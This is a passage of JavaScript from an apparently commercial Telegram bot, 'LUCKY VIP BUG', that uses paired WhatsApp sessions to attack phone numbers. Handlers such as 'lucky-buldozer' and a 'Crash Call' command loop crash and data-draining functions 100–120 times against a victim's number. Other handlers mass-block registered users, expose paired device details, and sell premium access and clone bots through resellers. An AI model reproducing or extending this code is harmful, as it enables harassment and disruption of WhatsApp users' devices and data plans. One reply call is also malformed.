        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ Sahih WhatsApp number likhein.");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        
        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>WHATSAPP IS NOT CONNECTED.</b>\n" +
                "USE PAIR AND CONNECT:\n" +
                "<code>/reqpair 923xxxx</code>",
                { parse_mode: "HTML" }
             + groupHint);
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🍷 <b>type bug:</b> <code>Crash Call</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗚𝗥𝗢𝗨𝗣",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });

       
               (async () => {
                for (let z = 0; z < 100; z++) {
                await Occolot(client, X);
                }
                })();
       

        
    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi....");
    }
    break;
}

      case "lucky-buldozer": {
    try {
        const userId = ctx.from.id.toString();
        const cooldownCheck = cooldownModule.checkCooldown(userId, "delay");

        if (cooldownCheck.onCooldown) {
            return ctx.reply(
                `⏳ PLEASE WAIT FOR SOME TIME  ❮${cooldownCheck.remaining}❯ TO USE  /lucky-buldozer AGAIN..`,
                { parse_mode: "Markdown" }
            );
        }

        cooldownModule.updateCooldown(userId, "delay");
        const input = ctx.message.text.split(" ")[1];
        
        if (!input) {
            return ctx.reply(
                "<b>⚠️ Format Yang Benar</b>\n" +
                "Gunakan format:\n" +
                "<code>/lucky-buldozer 628xxxxxxx</code>\n\n" +
                "<i>Contoh:</i> <code>/lucky-buldozer 628123456789</code>",
                { parse_mode: "HTML" }
            );
        }

        const target = input.trim();
        const cleanTarget = target.replace(/[^0-9]/g, "");
        
        if (!cleanTarget || cleanTarget.length < 10) {
            return ctx.reply("❌ WhatsApp number galat hai! (kam az kam 10 digits)");
        }

        const X = `${cleanTarget}@s.whatsapp.net`;
        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        
        if (!waResult) {
            const groupHint = isGroup
              ? "\n\nGroup mein koi /setgroupsender kare ya apna number /reqpair se pair karo."
              : "\n\nApna number /reqpair se pair karo.";
            return ctx.reply(
                "<b>WHATSAPP IS NOT CONNECTED</b>\n" +
                "USE PAIR AND CONNECT:\n" +
                "<code>/reqpair 923xxxx</code>" + groupHint,
                { parse_mode: "HTML" }
            );
        }

        const client = waResult.client;
        const imageMenu = config.thumburl;
        
        await ctx.replyWithPhoto(imageMenu, {
            caption:
                "<b>「  𝗟𝗨𝗖𝗞𝗬 𝗩𝗜𝗣 𝗕𝗨𝗚 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n" +
                `👤 <b>target :</b> <code>${cleanTarget}</code>\n` +
                `🍷 <b>type bug:</b> <code>sedot kuota andro</code>\n` +
                "📊 <b>status:</b> <code>🦠 succes executions</code>\n\n" +
                `<b>📞 Support</b>\nContact @luckyhackr for assistance`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗚𝗥𝗢𝗨𝗣",
                            url: "https://t.me/lucky_vipbug",
                        },
                        {
                            text: "𝗢𝗪𝗡𝗘𝗥",
                            url: "https://t.me/luckyhackr",
                        },
                    ],
                ],
            },
        });

               (async () => {
                for (let z = 0; z < 120; z++) {
                await BuldozerCombine(client, X, ptcp = true);
                await ZenoDrainKuota(client, X, ptcp = true);
                await Atut(client, X);
                await new Promise(resolve => setImmediate(resolve));
                }
                })();
       

        
    } catch (e) {
        log.error(`BUG ERROR: ${e.message}`);
        await ctx.reply("❌ Bug chalate waqt kharabi aayi....");
    }
    break;
}
      
      case "clearsender": {
        try {
          const userId = ctx.from.id.toString();
          if (!checkCommandAccess(userId, "clearsender")) {
            return ctx.reply(getNoAccessMessage(userId));
          }

          const confirmMsg = await ctx.reply(
            "⚠️ WARNING ⚠️\n\nTHIS ACTION CAN DELETE ALL WHATSAPP SESSION DATA AND RESTART THE BOT",
            {
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "✅ Haan, Sab Delete Karo",
                      callback_data: "clearsender_confirm",
                    },
                    { text: "❌ Nahi", callback_data: "clearsender_cancel" },
                  ],
                ],
              },
            }
          );
        } catch (err) {
          log.error(`Error in /clearsender for ${userId}: ${err.message}`);
          await ctx.reply("ERROR WHILE ACCEPTING REQUEST.");
        }
        break;
      }

      /**
       * fitue cooldown created by siros
       * cocok buat murbug ye
       * sistem bakal ngebaca otomatis pas ada yg gunain cmd bugnya yg di cooldow
       * janlup aktifin /cdon terlebih dahulu
       */

      case "cdon": {
        try {
          const userId = ctx.from.id.toString();
          if (!isOwner(ctx.from.id))
    return ctx.reply("❌ only owner!");

          const cooldownModule = require("./controlSystem/sumemek.js");
          cooldownModule.enableCooldown();

          await ctx.reply(
            "PLEASE WAIT FOR ❮20 MINTS❯ TO USE COMMANDS\n\n" +
              "ALL CMNDS:\n" +
              "• /lucky-efcenew\n" +
              "• /lucky-delaynew\n" +
              "• /lucky-ios\n\n" +
              "BILAL-MD",
            { parse_mode: "Markdown" }
          );
        } catch (e) {
          log.error(`CDON ERROR: ${e.message}`);
          await ctx.reply("❌ Command mein kharabi aayi.");
        }
        break;
      }
      case "cdoff": {
        try {
          const userId = ctx.from.id.toString();
          if (userId !== config.ownerId.toString()) {
            return ctx.reply(
              "ONLY OWNER CAN USE THIS CMND."
            );
          }

          const cooldownModule = require("./controlSystem/sumemek.js");
          cooldownModule.disableCooldown();

          await ctx.reply(
            "✅ *SYSTEM IS NOW OFF*\n\n" +
              "NOW EVERYONE CAN USE ALL CMNDS",
            { parse_mode: "Markdown" }
          );
        } catch (e) {
          log.error(`CDOFF ERROR: ${e.message}`);
          await ctx.reply("❌ Command mein kharabi aayi.");
        }
        break;
      }
      case "setcd": {
        try {
          const userId = ctx.from.id.toString();
          const cooldownModule = require("./controlSystem/sumemek.js");

          const isEnabled = cooldownModule.isCooldownEnabled();
          const userStatus = cooldownModule.getUserCooldownStatus(userId);

          let message = "📊 *Status Cooldown System*\n";
          message += "═══════════════════════════════════\n\n";
          message += `🔧 *Status:* ${
            isEnabled ? "ON" : "OFF"
          }\n\n`;

          message += "*WAIT:*\n";
          message += "───────────────────────\n";

          for (const [cmd, info] of Object.entries(userStatus)) {
            const status = info.onCooldown
              ? `WAIT  (${info.remaining} MINTS)`
              : "CMND IS READY FOR USE";
            message += `• /${cmd}: ${status}\n`;
            message += `  LAST USED ❯ ${info.lastUsed}\n`;
          }

          message += "\n═══════════════════════════════════\n";
          message += "⏰ *PLEASE WAIT 20 MINTS TO USE CMND\n";
          message += "OTHER CMNDS OTHER TIMES";

          await ctx.reply(message, { parse_mode: "Markdown" });
        } catch (e) {
          log.error(`SETCD ERROR: ${e.message}`);
          await ctx.reply("❌ Command mein kharabi aayi.");
        }
        break;
      }

      case "setcd": {
        const userId = ctx.from.id.toString();
        if (!isOwner(ctx.from.id) && !isReseller(ctx.from.id))
    return ctx.reply("ONLY FOR BOT OWNERS");

        const cmdName = args[0];
        const minutes = parseInt(args[1]);

        if (!cmdName || isNaN(minutes)) {
          return ctx.reply(
            "👀 *Usage:* /setcd <command> <minutes>\nPLEASE SET LONG TIME FOR BETTER BOT WORKS"
          );
        }

        const result = cooldown.setCooldown(cmdName, minutes);
        return ctx.reply(result.message);
      }

      case "reqpair": {
        try {
          const userId = ctx.from.id.toString();

          const phone = args[0]?.replace(/[^0-9]/g, "");
          if (!phone) {
            return await ctx.reply(
              "⚠️ *CMD ERROR!*\nEXAMPLE:\n`/reqpair 923xxxxxx`",
              { parse_mode: "Markdown" }
            );
          }

          const exists = await checkSessionExistsForUser(userId);
          if (exists && waClients[userId]?.status === "open") {
            return ctx.reply("BOT IS ALREADY ACTIVE ON YOUR NUMBER", {
              parse_mode: "Markdown",
            });
          }

          const waitMessage = await ctx.reply(
            "⏳ *Connecting*\nPlease Wait.....",
            { parse_mode: "Markdown" }
          );
          await initWhatsappForUser(userId, true);
          waClients[userId].waitMessageId = waitMessage.message_id;

          await new Promise((r) => setTimeout(r, 800));
          const client = waClients[userId]?.sock;
          if (!client) {
            await ctx.api
              .deleteMessage(userId, waitMessage.message_id)
              .catch(() => {});
            return ctx.reply(
              "Pair code error."
            );
          }

          if (typeof client.requestPairingCode === "function") {
            const code = await client.requestPairingCode(phone);
            await ctx.api
              .deleteMessage(userId, waitMessage.message_id)
              .catch(() => {});
            const pairingMessage = await ctx.reply(
              `✅ *Pairing Connected!*\n\n📱 *Number:* \`${phone}\`\n🔐 *Code:* \`${code}\`\n\nPlease connect it with your whatsapp.`,
              { parse_mode: "Markdown" }
            );

            waClients[userId].pairingMessageId = pairingMessage.message_id;

            setTimeout(async () => {
              try {
                if (waClients[userId]?.status !== "open") {
                  await ctx.api.sendMessage(
                    userId,
                    "⏰ *Pairing Code Expired*\nTry Again `/reqpair 923xxx`.",
                    { parse_mode: "Markdown" }
                  );
                  if (waClients[userId]) {
                    try {
                      await waClients[userId].sock.end();
                    } catch {}
                    delete waClients[userId];
                  }
                }
              } catch (e) {
                log.error(`Timeout handler for ${userId}: ${e.message}`);
              }
            }, 60 * 1000);
          } else {
            await ctx.api
              .deleteMessage(userId, waitMessage.message_id)
              .catch(() => {});
            return ctx.reply(
              "⚠️ Baileys Error."
            );
          }
        } catch (err) {
          log.error(`Pairing failed for ${userId}: ${err.message}`);
          await ctx.reply(
            "Airing Code Failed.",
            { parse_mode: "Markdown" }
          );
        }
        break;
      }

      /**
       * ngebaca semua pairing data dari user yo
       * misal mau tambahin data expose lagi , tinggal samain dari freekey
       */

      case "listpair": {
        try {
          const userId = ctx.from.id.toString();

          // Check permission — only owner or premium users allowed
          const users = Array.isArray(premiumUsers) ? premiumUsers : [];
          const isPremium = users.some(
            (u) =>
              u &&
              u.id === userId &&
              u.expiresAt &&
              new Date(u.expiresAt) > new Date()
          );

          if (!isOwner(userId) && !isPremium) {
            return ctx.reply(
              "❌ *Ijazat Nahi*\n\nYeh command sirf *Owner* aur *Premium Users* use kar sakte hain.",
              { parse_mode: "Markdown" }
            );
          }

          // Get allowed senders for this user
          const allowedSenders = getUserSenders(userId);

          let result = "*BOT ARE CONNECTED ON ALL NUMBERS*\n";
          result += "═══════════════════════════════════\n\n";
          let count = 0;

          for (const uid in waClients) {
            const clientData = waClients[uid];

            // Non-owner users only see their own senders
            if (!isOwner(userId)) {
              const sock = clientData?.sock;
              const userJid = sock?.user?.id || clientData?.phone || "";
              const phoneNumber = userJid.includes("@")
                ? userJid.split("@")[0]
                : clientData?.phone || uid;
              if (!allowedSenders.includes(phoneNumber) && !allowedSenders.includes(uid)) {
                continue;
              }
            }

            if (!clientData || clientData?.status !== "open") continue;

            const sock = clientData?.sock;
            if (!sock) continue;

            count++;

            try {
              const authState = sock?.authState;
              const creds = authState?.creds || {};
              const me = creds?.me || {};

              const userJid = sock?.user?.id || me?.id || sock?.user?.jid || "";
              const socketUser = sock?.user || {};

              let phoneNumber = clientData?.phone || "Unknown";
              if (userJid && userJid.includes("@")) {
                phoneNumber = userJid.split("@")[0];
              }

              const deviceModel =
                me?.device ||
                socketUser?.device ||
                creds?.platformDisplayName ||
                "Unknown";
              const deviceName =
                me?.name || socketUser?.name || creds?.deviceModel || "Unknown";
              const platform =
                creds?.platform || socketUser?.platform || "WhatsApp";

              let waVersion = "Unknown";
              if (creds?.waVersion) {
                waVersion = Array.isArray(creds.waVersion)
                  ? creds.waVersion.join(".")
                  : creds.waVersion.toString();
              }

              let deviceId = "Unknown";
              try {
                if (creds?.signedIdentityKey?.public) {
                  const keyBuffer = Buffer.isBuffer(
                    creds.signedIdentityKey.public
                  )
                    ? creds.signedIdentityKey.public
                    : Buffer.from(creds.signedIdentityKey.public);
                  deviceId = keyBuffer
                    .toString("hex")
                    .slice(0, 16)
                    .toUpperCase();
                } else if (typeof creds?.signedIdentityKey === "string") {
                  deviceId = creds.signedIdentityKey.slice(0, 16).toUpperCase();
                } else if (creds?.me?.id) {
                  deviceId = creds.me.id
                    .split(":")[0]
                    .slice(0, 16)
                    .toUpperCase();
                }
              } catch (keyErr) {
                deviceId = "HASH_ERROR";
              }

              const lastSync = creds?.lastAccountSyncTimestamp
                ? new Date(creds.lastAccountSyncTimestamp).toLocaleString(
                    "id-ID"
                  )
                : "Never synced";

              let telegramName = "Unknown User";
              let telegramUsername = "No Username";

              try {
                const telegramData = await ctx.api
                  .getChat(uid)
                  .catch(() => null);
                if (telegramData) {
                  telegramName =
                    telegramData?.first_name ||
                    telegramData?.title ||
                    "Unknown";
                  telegramUsername = telegramData?.username
                    ? `@${telegramData.username}`
                    : "No Username";
                }
              } catch (tgErr) {}

              const connectionStatus =
                clientData?.status === "open" ? "Active" : " Offline";

              result +=
                `⚡ *SENDER LIST NO. ${count}*` +
                `────────────────────────────────────\n` +
                `👤 *Telegram : ${telegramName}*\n` +
                `🔑 *TG ID : \`${uid}\`*\n` +
                `🌐 *Username : ${telegramUsername}*\n` +
                `\n` +
                `📱 *WhatsApp : \`${phoneNumber}\`*\n` +
                `📟 *Nama Device : ${deviceName}*\n` +
                `🔧 *Tipe Device : ${deviceModel}*\n` +
                `💻 *Platform : ${platform}*\n` +
                `📦 *Versi WA : ${waVersion}*\n` +
                `🔐 *Device Hash : \`${deviceId}\`*\n` +
                `⏱️ *Last Sync : ${lastSync}*\n` +
                `🔗 *Status : ${connectionStatus}*\n` +
                `\n`;
            } catch (innerErr) {
              log.error(`[LISTPAIR] Error client ${uid}: ${innerErr.message}`);

              result +=
                `⚡ *SENDER LIST NO. ${count}*` +
                `👤 *User ID : \`${uid}\`*\n` +
                `🔗 *Status : ✅ Connected (Data partial)*\n` +
                `BILAL-MD\n\n`;
            }
          }

          if (count === 0) {
            const emptyMsg = isOwner(userId)
              ? "ℹ️ *Koi bhi WhatsApp Sender active nahi hai.*\n\nNaya sender add karo: `/reqpair`"
              : "ℹ️ *Tumhara koi bhi WhatsApp Sender active nahi hai.*\n\nNaya sender add karo: `/reqpair`";
            return ctx.reply(emptyMsg, { parse_mode: "Markdown" });
          }

          result += `═══════════════════════════════════\n`;
          result += `📊 *Total Active:* ${count}\n`;
          result += `📅 *Check Time:* ${new Date().toLocaleString("id-ID")}`;

          await ctx.reply(result, { parse_mode: "Markdown" });
        } catch (e) {
          log.error(`[LISTPAIR] Critical error: ${e.message}`);
          await ctx.reply(
            "❌ *CMD ERROR*",
            { parse_mode: "Markdown" }
          );
        }
        break;
      }

      /**
       * oppsional mau pake ini atau clearsender
       */

      case "clearsesi": {
        try {
          let targetUserId = userId;
          if (args[0] && isOwner(userId)) {
            targetUserId = args[0];
          }

          const client = waClients[targetUserId];
          if (!client) {
            return ctx.reply(
              "Not Active for this session",
              { parse_mode: "Markdown" }
            );
          }

          if (client.sock?.end) {
            await client.sock.end().catch(() => {});
          }

          delete waClients[targetUserId];

          await ctx.reply(
            ` SESSION DATA FOR THIS USER${targetUserId} HAS BEEN DELETED`,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          log.error(`Failed to clear session for ${userId}: ${err.message}`);
          await ctx.reply("❌ Error.", {
            parse_mode: "Markdown",
          });
        }
        break;
      }

      case "broadcast": {
        const userId = ctx.from.id.toString();
        if (!isOwner(ctx.from.id) && !isReseller(ctx.from.id))
    return ctx.reply("Only Resellers Can Access");
        const msg = args.join(" ");
        if (!msg) {
          log.warning("Empty broadcast message");
          return ctx.reply("⚠️ Use /broadcast <pesan>");
        }
        const users = JSON.parse(
          fs.readFileSync("database/users.json", "utf8")
        );
        log.loading(
          `Broadcasting message to ${chalk.yellow(users.length)} users...`
        );
        let ok = 0,
          fail = 0;
        for (const id of users) {
          try {
            await ctx.api.sendMessage(id, msg);
            ok++;
          } catch {
            fail++;
          }
}
        log.success(
          `Broadcast completed: ${chalk.green(ok)} sent, ${chalk.red(
            fail
          )} failed`
        );
        ctx.reply(`✅ Sent: ${ok}\n❌ Failed: ${fail}`);
        break;
      }

  

        case "addacces": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId) && !isReseller(userId))
          return ctx.reply("Only Owner And Resellers can access");

        const target = args[0];
        if (!target) return ctx.reply("⚠️ Use /addacces <userId>");

        const access = loadAccessDb();
        if (access.users.includes(String(target)))
          return ctx.reply("⚠️ Yeh user pehle se premium hai!");

        access.users.push(String(target));
        saveAccessDb(access);

        ctx.reply(`✅ *Permanent Premium Add Ho Gaya!*\n\nUser ID: \`${target}\`\nStatus: Permanent (expire nahi hoga)`, { parse_mode: "Markdown" });

        // ─── Owner ko notification bhejo (agar reseller ne add kiya) ────
        if (!isOwner(userId)) {
          const resellerUsername = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
          const notifMsg =
            `🔔 *Premium Add Notification*\n\n` +
            `👤 Reseller: ${resellerUsername} (\`${userId}\`)\n` +
            `➕ Premium diya: \`${target}\`\n` +
            `📅 Time: ${new Date().toLocaleString()}\n` +
            `📌 Status: Permanent`;
          try {
            await bot.api.sendMessage(config.ownerId, notifMsg, { parse_mode: "Markdown" });
          } catch (_) {}
        }
        // ─────────────────────────────────────────────────────────────────

        break;
      }
      
      // ─── /ban <number> — Target ko report + block karo ─────────────
      case "ban": {
        if (!isOwner(userId) && !isReseller(userId) && !hasAccess(userId))
          return ctx.reply("❌ Yeh command premium users ke liye hai!");

        const target = args[0];
        if (!target) return ctx.reply(
          "<b>CMD ERROR</b>\nSahi tarika:\n<code>/ban 923xxxxxxx</code>",
          { parse_mode: "HTML" }
        );

        const cleanTarget = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

        const waResult = getWAClient(userId, ctx.chat.id, isGroup);
        if (!waResult) return ctx.reply(
          "❌ WhatsApp connected nahi hai!\n<code>/reqpair 923xxxx</code>",
          { parse_mode: "HTML" }
        );
        const client = waResult.client;

        const statusMsg = await ctx.reply(
          `⏳ <b>Ban ho raha hai...</b>\n👤 Target: <code>${target}</code>`,
          { parse_mode: "HTML" }
        );

        try {
          // Report as spam
          await client.updateBlockStatus(cleanTarget, "block");
          // Thodi der baad report
          await new Promise(r => setTimeout(r, 1000));
          try {
            await client.sendMessage(cleanTarget, { 
              text: "", 
              disappearingMessagesInChat: true 
            });
          } catch (_) {}

          await ctx.api.editMessageText(
            ctx.chat.id, statusMsg.message_id,
            `✅ <b>Kamyabi se Ban Kar Diya!</b>\n\n👤 Target: <code>${target}</code>\n🚫 Action: Report + Block\n📅 Time: ${new Date().toLocaleString()}`,
            { parse_mode: "HTML" }
          );
        } catch (e) {
          await ctx.api.editMessageText(
            ctx.chat.id, statusMsg.message_id,
            `❌ Ban karte waqt masla: ${e.message}`,
            { parse_mode: "HTML" }
          );
        }
        break;
      }

      case "free": {
        if (!isOwner(userId))
          return ctx.reply("❌ Sirf owner yeh command use kar sakta hai!");

        const settings = JSON.parse(fs.readFileSync("./database/settings.json", "utf8"));
        settings.freeMode = !settings.freeMode;
        fs.writeFileSync("./database/settings.json", JSON.stringify(settings, null, 2));

        if (settings.freeMode) {
          ctx.reply(
            "🟢 *Free Mode Active*\nAb sab users tamam commands use kar sakte hain.",
            { parse_mode: "Markdown" }
          );

          // ─── Free Mode ON: Sab active bots ke users ko mass report+block ──
          const reportNotif = await bot.api.sendMessage(
            config.ownerId,
            "🔄 *Mass Report/Block shuru ho raha hai...*\nSab connected WA numbers se sab registered users ko report + block kiya jayega.",
            { parse_mode: "Markdown" }
          ).catch(() => null);

          // Background mein chalao
          (async () => {
            try {
              const userPath = path.join("database", "users.json");
              const allUsers = fs.existsSync(userPath)
                ? JSON.parse(fs.readFileSync(userPath, "utf8"))
                : [];

              // Sab connected WA clients collect karo
              const activeClients = Object.entries(waClients)
                .filter(([, entry]) => entry?.status === "open" && entry?.sock)
                .map(([, entry]) => entry.sock);

              if (activeClients.length === 0) {
                await bot.api.sendMessage(config.ownerId, "⚠️ Koi WA number connected nahi — report nahi ho saka.").catch(() => null);
                return;
              }

              let successCount = 0;
              let failCount = 0;

              for (const targetUserId of allUsers) {
                // Owner aur resellers ko skip karo
                if (isOwner(targetUserId) || isReseller(targetUserId)) continue;

                // Har user ka WA number database mein ho to use karo
                // Fallback: Telegram ID se nahi ban sakte, sirf WA number wale users
                try {
                  const waPath = path.join("database", `wa_${targetUserId}.json`);
                  if (!fs.existsSync(waPath)) continue;
                  const waData = JSON.parse(fs.readFileSync(waPath, "utf8"));
                  if (!waData.number) continue;

                  const targetJid = waData.number.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

                  // Sab active WA clients se block karo
                  for (const client of activeClients) {
                    try {
                      await client.updateBlockStatus(targetJid, "block");
                      await new Promise(r => setTimeout(r, 500));
                    } catch (_) {}
                  }
                  successCount++;
                  await new Promise(r => setTimeout(r, 200));
                } catch (_) {
                  failCount++;
                }
              }

              await bot.api.sendMessage(
                config.ownerId,
                `✅ *Mass Report/Block Complete!*\n\n✔️ Success: ${successCount}\n❌ Skip/Fail: ${failCount}\n📱 WA Numbers used: ${activeClients.length}`,
                { parse_mode: "Markdown" }
              ).catch(() => null);

            } catch (e) {
              log.error(`Mass ban error: ${e.message}`);
              await bot.api.sendMessage(config.ownerId, `❌ Mass ban error: ${e.message}`).catch(() => null);
            }
          })();
          // ────────────────────────────────────────────────────────────────

        } else {
          const offKeyboard = new InlineKeyboard()
            .text("💳 Payment ki Tafseel", "show_payment")
            .row()
            .url("📞 @luckyhackr", "https://t.me/luckyhackr");
          ctx.reply(
            "🔒 *Free Mode Off*\nAb sirf Premium Users, Owner aur Reseller bot use kar sakte hain.\nPremium lene ke liye neeche button dabayein.",
            { parse_mode: "Markdown", reply_markup: offKeyboard }
          );
        }

        break;
      }

      // ─── /ref — Apna referral link dekho ────────────────────────────
      case "ref": {
        const userId = ctx.from.id.toString();
        const code = getReferralCode(userId);
        const botInfo = await bot.api.getMe();
        const refLink = `https://t.me/${botInfo.username}?start=${code}`;
        const data = referralData[userId];
        const inviteCount = data?.inviteCount || 0;
        const needed = Math.max(0, referralLimit - inviteCount);
        const rewardGiven = data?.rewardGiven || false;

        // Check karein kab tak premium hai
        const premEntry = premiumUsers.find(u => u && u.id === userId);
        let expiryLine = "";
        if (premEntry) {
          const expDate = new Date(premEntry.expiresAt);
          const diffMs = expDate - Date.now();
          const diffDays = Math.ceil(diffMs / (1000 * 60 * 60 * 24));
          expiryLine = diffDays > 0
            ? `\n⏳ *Premium Expiry:* ${diffDays} din baaki`
            : `\n❌ *Premium expire ho gaya!*`;
        }

        let statusMsg = rewardGiven
          ? `✅ Reward mil chuka hai! (7 din Premium)${expiryLine}`
          : `📊 Progress: *${inviteCount}/${referralLimit}* — Abhi *${needed}* aur chahiye`;

        await ctx.reply(
          `🔗 *Aapka Referral Link*\n\n` +
          `\`${refLink}\`\n\n` +
          `${statusMsg}\n\n` +
          `👆 Yeh link apne dosto ko bhejein.\n` +
          `Jab *${referralLimit}* log join karein to aapko *7 din ka Free Premium* milega! 🎁`,
          { parse_mode: "Markdown" }
        );
        break;
      }

      // ─── /refstats — Owner ke liye sab referrals dekho ──────────────
      case "refstats": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId)) return ctx.reply("❌ Sirf owner yeh dekh sakta hai!");

        const entries = Object.entries(referralData);
        if (entries.length === 0) return ctx.reply("📭 Abhi koi referral nahi hai.");

        let msg = `📊 *Referral Stats*\n${"━".repeat(25)}\n`;
        for (const [uid, d] of entries) {
          msg += `👤 \`${uid}\`\n`;
          msg += `   Invites: ${d.inviteCount} | Reward: ${d.rewardGiven ? "✅" : "❌"}\n`;
        }
        msg += `${"━".repeat(25)}\nTotal users: ${entries.length}`;
        await ctx.reply(msg, { parse_mode: "Markdown" });
        break;
      }

      // ─── /setreflimit <number> — Invite limit change karo ───────────
      case "setreflimit": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId)) return ctx.reply("❌ Sirf owner yeh change kar sakta hai!");

        const newLimit = parseInt(args[0]);
        if (isNaN(newLimit) || newLimit < 1)
          return ctx.reply("⚠️ Sahi number likhein. Misaal: /setreflimit 5");

        referralLimit = newLimit;
        saveReferrals(); // File mein save karo taake restart ke baad bhi rahe

        await ctx.reply(
          `✅ *Referral limit update ho gayi!*\n\nAb *${newLimit}* invites par premium milega.`,
          { parse_mode: "Markdown" }
        );
        break;
      }

      case "delacces": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId) && !isReseller(userId))
          return ctx.reply("❌ Only owner and resellers can access");

        const target = args[0];
        if (!target) return ctx.reply("⚠️ Use /delacces <userId>");

        const accessDel = loadAccessDb();
        accessDel.users = accessDel.users.filter(x => x !== String(target));
        saveAccessDb(accessDel);

        ctx.reply(`🗑 *Premium Remove Ho Gaya!*\n\nUser ID: \`${target}\``, { parse_mode: "Markdown" });

        // ─── Owner ko notification (agar reseller ne remove kiya) ───────
        if (!isOwner(userId)) {
          const resellerUsername = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
          const notifMsg =
            `🔕 *Premium Remove Notification*\n\n` +
            `👤 Reseller: ${resellerUsername} (\`${userId}\`)\n` +
            `➖ Premium hataya: \`${target}\`\n` +
            `📅 Time: ${new Date().toLocaleString()}`;
          try {
            await bot.api.sendMessage(config.ownerId, notifMsg, { parse_mode: "Markdown" });
          } catch (_) {}
        }
        // ─────────────────────────────────────────────────────────────────

        break;
      }

      case "listacces": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId) && !isReseller(userId))
          return ctx.reply("❌ only for owners and resellers can access!");

        const access = loadAccessDb();
        if (access.users.length < 1)
          return ctx.reply("📭 Access Lost is empty");

        ctx.reply(
          `📌 List Access:\n${access.users.map(x => `• ${x}`).join("\n")}`
        );
        break;
      }

      case "address": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId))
          return ctx.reply("❌ only owner!");

        const target = args[0];
        if (!target) return ctx.reply("⚠️ Use /addres <userId>");

        addReseller(target);
        ctx.reply(`🟢 Reseller Added: ${target}`);
        break;
      }

      case "delress": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId))
          return ctx.reply("❌ Only owner!");

        const target = args[0];
        if (!target) return ctx.reply("⚠️ Use /delres <userId>");

        removeReseller(target);
        ctx.reply(`🔴 Reseller Deleted: ${target}`);
        break;
      }

      case "listress": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId))
          return ctx.reply("❌ Only owner!");

        const db = JSON.parse(fs.readFileSync("./storage/resellers.json", "utf8"));
        if (db.users.length < 1)
          return ctx.reply("📭 List reseller Empty");

        ctx.reply(
          `📌 List Reseller:\n${db.users.map(x => `• ${x}`).join("\n")}`
        );
        break;
      }

      // ─── /deploybot <token> <owner_id> — Apna clone bot deploy karo ──
      case "deploybot": {
        if (!isOwner(userId) && !isReseller(userId))
          return ctx.reply("❌ Sirf owner ya reseller yeh command use kar sakta hai!");

        const token = args[0];
        const ownerIdArg = args[1];

        if (!token || !ownerIdArg) {
          return ctx.reply(
            "🖥 Format: /deploybot <token> <owner_id>\n\n" +
            "Token @BotFather se lein aur owner_id apni Telegram numeric ID dein."
          );
        }

        if (!isValidBotToken(token)) {
          return ctx.reply("❌ Token galat hai! Sahi format:\n123456789:ABCDEF-your_token");
        }

        if (!/^\d{5,}$/.test(ownerIdArg)) {
          return ctx.reply("❌ owner_id sirf numeric Telegram ID hona chahiye!");
        }

        const clonesDb = loadClonesDb();

        if (clonesDb.bots.some((b) => b.token === token)) {
          return ctx.reply("⚠️ Yeh token pehle se deploy hai!");
        }

        const deployId = generateDeployId(clonesDb);
        await ctx.reply(`⏳ Bot deploy ho raha hai... ID: ${deployId}`);

        try {
          // 1. Token validate karo
          const tempBot = new Bot(token);
          const botInfo = await tempBot.api.getMe().catch((e) => {
            throw new Error("Token invalid ya accessible nahi: " + e.message);
          });

          // 2. Clone config object banao (lucky.js ka config variable replace ho jata hai require se)
          const cloneConfig = {
            ownerId: Number(ownerIdArg),
            telegramBotToken: token,
            sessionName: "session",
            chanelid: config.chanelid,
            chatgrupid: config.chatgrupid,
            thumburl: config.thumburl,
          };

          // 3. Clone ke liye fresh database directory
          const cloneDbDir = path.join(process.cwd(), "clones", deployId);
          fs.mkdirSync(path.join(cloneDbDir, "database"), { recursive: true });
          fs.mkdirSync(path.join(cloneDbDir, "storage"), { recursive: true });

          // 4. Same process mein naya grammY Bot banao aur SARI handlers copy karo
          //    Tarika: lucky.js ko env variable se token pass karke fork karo
          //    AstaHost pe yeh sabse reliable hai
          process.env[`CLONE_${deployId}_TOKEN`] = token;
          process.env[`CLONE_${deployId}_OWNER`] = String(ownerIdArg);
          process.env[`CLONE_${deployId}_DB`] = cloneDbDir;

          const { fork } = require("child_process");
          const cloneProcess = fork(path.join(process.cwd(), "lucky.js"), [], {
            env: {
              ...process.env,
              BOT_TOKEN_OVERRIDE: token,
